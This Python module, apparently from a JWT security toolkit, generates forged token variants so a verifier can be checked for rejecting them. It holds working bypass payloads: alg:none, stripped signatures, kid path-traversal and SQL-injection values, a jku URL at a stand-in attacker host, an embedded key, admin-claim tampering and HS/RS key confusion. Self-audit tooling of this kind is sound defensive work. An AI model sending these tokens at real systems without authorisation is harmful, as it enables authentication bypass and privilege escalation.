import hashlib
import hmac
import json
from collections.abc import Iterable
from dataclasses import dataclass

from jwt_toolkit.core.decoder import DecodedToken
from jwt_toolkit.core.encoding import base64url_encode

# Forge module — produces defensive test-case variants of a user's JWT.
#
# Every variant in this module is designed to be REJECTED by a correctly
# configured verifier. The caller's job is to feed each variant at their
# verifier and confirm rejection. If any variant is accepted, the verifier
# has the matching vulnerability.
#
# This is NOT an offensive tool — there is no live targeting, no credential
# theft, no detection-evasion. It is a test-case generator for self-audit.


# Public CVE references that map cleanly to a specific variant shape.
_CVE_ALG_NONE = "CVE-2015-2951"
_CVE_HS_RS_CONFUSION = "CVE-2016-10555"
_CVE_JWK_INJECTION = "CVE-2018-0114"


@dataclass(frozen=True)
class Variant:
    # Stable machine-readable name — safe to pass to --mode and to JSON consumers.
    name: str
    # One-line human description of what the variant tests for.
    description: str
    # CVE reference when the variant maps to a publicly disclosed vulnerability.
    cve: str | None
    # The forged token, ready to feed at the user's verifier.
    token: str


# Ordered registry of variant names that do not require any extra input.
# `hs_rs_confusion` is appended only when the caller supplies a public key.
STATIC_VARIANT_NAMES: tuple[str, ...] = (
    "alg_none_lower",
    "alg_none_upper",
    "alg_none_mixed",
    "empty_signature",
    "kid_path_traversal",
    "kid_sql_injection",
    "jku_attacker",
    "jwk_embedded",
    "tampered_payload",
)

KEY_BASED_VARIANT_NAMES: tuple[str, ...] = ("hs_rs_confusion",)

ALL_VARIANT_NAMES: tuple[str, ...] = STATIC_VARIANT_NAMES + KEY_BASED_VARIANT_NAMES


# Default attacker-shaped values for the injection-style variants. These are
# the exact strings the auditor flags in its `_audit_*` checks — keeping the
# two modules in lockstep means a passing forge variant proves the auditor's
# warning is real.
_KID_PATH_TRAVERSAL_VALUE = "../../etc/passwd"
_KID_SQL_INJECTION_VALUE = "x' OR '1'='1"
_JKU_ATTACKER_URL = "https://attacker.example/keys"
_EMBEDDED_JWK_VALUE = {
    "kty": "oct",
    "k": "YXR0YWNrZXItc3VwcGxpZWQta2V5",
    "alg": "HS256",
}
_TAMPERED_CLAIM_OVERRIDES = {"role": "admin", "admin": True}


def generate_variants(
    decoded: DecodedToken,
    *,
    public_key_pem: bytes | None = None,
    names: Iterable[str] | None = None,
) -> list[Variant]:
    # Build every requested variant. `names=None` means "all available given
    # the supplied inputs" — static-only when no key is provided, plus the
    # key-based variants when one is. Explicit `names` skips that inference
    # and lets the caller request anything; mismatches surface from forge_one.
    if names is None:
        selected: tuple[str, ...] = (
            STATIC_VARIANT_NAMES if public_key_pem is None else ALL_VARIANT_NAMES
        )
    else:
        selected = tuple(names)
    return [forge_one(name, decoded, public_key_pem=public_key_pem) for name in selected]


def forge_one(
    name: str,
    decoded: DecodedToken,
    *,
    public_key_pem: bytes | None = None,
) -> Variant:
    builder = _BUILDERS.get(name)
    if builder is None:
        raise ValueError(
            f"Unknown forge variant: {name}. Available: {', '.join(ALL_VARIANT_NAMES)}"
        )
    if name in KEY_BASED_VARIANT_NAMES and public_key_pem is None:
        raise ValueError(
            f"Variant {name!r} requires --public-key — it forges using the "
            "verifier's own public key as an HMAC secret."
        )
    return builder(decoded, public_key_pem)


# Individual variant builders.
#
# Each builder takes the original DecodedToken and an optional public-key PEM.
# It returns a Variant whose `token` is the forged JWT string.


def _build_alg_none_lower(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    return Variant(
        name="alg_none_lower",
        description="alg:none with the signature stripped — verifier must reject unsigned tokens",
        cve=_CVE_ALG_NONE,
        token=_emit(_with_alg(decoded.header, "none"), decoded.payload, signature=""),
    )


def _build_alg_none_upper(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    return Variant(
        name="alg_none_upper",
        description="alg:NONE — case-variant bypass when the verifier normalises before checking",
        cve=_CVE_ALG_NONE,
        token=_emit(_with_alg(decoded.header, "NONE"), decoded.payload, signature=""),
    )


def _build_alg_none_mixed(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    return Variant(
        name="alg_none_mixed",
        description="alg:nOnE — mixed-case bypass against ad-hoc string comparisons",
        cve=_CVE_ALG_NONE,
        token=_emit(_with_alg(decoded.header, "nOnE"), decoded.payload, signature=""),
    )


def _build_empty_signature(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    return Variant(
        name="empty_signature",
        description="Original alg preserved but signature replaced with an empty string",
        cve=None,
        token=_emit(decoded.header, decoded.payload, signature=""),
    )


def _build_kid_path_traversal(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    new_header = {**decoded.header, "kid": _KID_PATH_TRAVERSAL_VALUE}
    return Variant(
        name="kid_path_traversal",
        description=(
            f"kid={_KID_PATH_TRAVERSAL_VALUE!r} — verifier must not concatenate kid into a file path"
        ),
        cve=None,
        token=_emit(new_header, decoded.payload, signature=decoded.signature),
    )


def _build_kid_sql_injection(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    new_header = {**decoded.header, "kid": _KID_SQL_INJECTION_VALUE}
    return Variant(
        name="kid_sql_injection",
        description=(
            f"kid={_KID_SQL_INJECTION_VALUE!r} — verifier must not concatenate kid into a SQL query"
        ),
        cve=None,
        token=_emit(new_header, decoded.payload, signature=decoded.signature),
    )


def _build_jku_attacker(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    new_header = {**decoded.header, "jku": _JKU_ATTACKER_URL}
    return Variant(
        name="jku_attacker",
        description=(
            f"jku={_JKU_ATTACKER_URL} — verifier must pin jku to an allow-list, not blindly fetch"
        ),
        cve=None,
        token=_emit(new_header, decoded.payload, signature=decoded.signature),
    )


def _build_jwk_embedded(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    new_header = {**decoded.header, "jwk": _EMBEDDED_JWK_VALUE}
    return Variant(
        name="jwk_embedded",
        description="JWK embedded in header — verifier must never trust header-supplied keys",
        cve=_CVE_JWK_INJECTION,
        token=_emit(new_header, decoded.payload, signature=decoded.signature),
    )


def _build_tampered_payload(decoded: DecodedToken, _pem: bytes | None) -> Variant:
    new_payload = {**decoded.payload, **_TAMPERED_CLAIM_OVERRIDES}
    return Variant(
        name="tampered_payload",
        description=(
            "Payload mutated to add admin claims while preserving the original "
            "signature — verifier must recompute and compare the signature"
        ),
        cve=None,
        token=_emit(decoded.header, new_payload, signature=decoded.signature),
    )


def _build_hs_rs_confusion(decoded: DecodedToken, pem: bytes | None) -> Variant:
    # CVE-2016-10555 shape: take the server's RSA public key, sign HS256 over
    # the header+payload using the PEM bytes as the HMAC secret. A vulnerable
    # verifier that accepts header-supplied alg will use its own public key
    # as the symmetric secret and the signature will verify.
    assert pem is not None  # guarded by forge_one
    new_header = {**decoded.header, "alg": "HS256"}
    h_b64 = _b64_json(new_header)
    p_b64 = _b64_json(decoded.payload)
    sig_bytes = hmac.new(pem, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    sig_b64 = base64url_encode(sig_bytes)
    return Variant(
        name="hs_rs_confusion",
        description=(
            "alg switched to HS256 and signed with the public key as the HMAC secret — "
            "verifier must pin one algorithm family per key"
        ),
        cve=_CVE_HS_RS_CONFUSION,
        token=f"{h_b64}.{p_b64}.{sig_b64}",
    )


_BUILDERS = {
    "alg_none_lower": _build_alg_none_lower,
    "alg_none_upper": _build_alg_none_upper,
    "alg_none_mixed": _build_alg_none_mixed,
    "empty_signature": _build_empty_signature,
    "kid_path_traversal": _build_kid_path_traversal,
    "kid_sql_injection": _build_kid_sql_injection,
    "jku_attacker": _build_jku_attacker,
    "jwk_embedded": _build_jwk_embedded,
    "tampered_payload": _build_tampered_payload,
    "hs_rs_confusion": _build_hs_rs_confusion,
}


# Helpers


def _with_alg(header: dict, alg: str) -> dict:
    return {**header, "alg": alg}


def _b64_json(obj: dict) -> str:
    return base64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def _emit(header: dict, payload: dict, *, signature: str) -> str:
    return f"{_b64_json(header)}.{_b64_json(payload)}.{signature}"
